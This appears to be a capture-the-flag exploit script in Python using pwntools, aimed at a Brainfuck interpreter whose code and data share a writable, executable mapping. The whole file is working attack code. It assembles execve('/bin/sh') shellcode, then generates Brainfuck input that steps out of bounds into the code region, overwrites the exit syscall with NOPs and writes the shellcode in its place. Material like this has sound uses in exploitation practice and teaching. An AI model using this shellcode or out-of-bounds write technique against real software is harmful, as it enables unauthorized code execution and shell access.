#!/usr/bin/env python3

# both data and code are in the same rwx mapping
# and there is no bounds checking on data pointer:
# it is possible to go left (<) into code, overwrite exit() syscall
# and write shellcode after

from pwn import *

context.update(arch='x86_64')

shellcode = asm(
    'mov rdi, 0x68732f6e69622f;' +
    'mov [rsp], rdi;' + # '/bin/sh\x00' at rsp
    'mov rdi, rsp;' + # rdi = filename = /bin/sh
    'xor rsi, rsi;' + # rsi = argv = NULL
    'xor rdx, rdx;' + # rdx = envp = NULL
    'xor rax, rax;' +
    'mov al, 59;' + # rax = syscal_no = 59
    'syscall;') # execve('/bin/sh', NULL, NULL)

print(f'shellcode: {shellcode.hex()}')

syscall = [0x0F, 0x05]
nop = 0x90
# change exit() syscall into nops
bf_code = '<<'
bf_code += '+' * (nop - syscall[0])
bf_code += '>' + '+' * (nop - syscall[1])
bf_code += '>'

for b in shellcode:
    print(b)
    bf_code += '+' * b + '>'

print(bf_code)
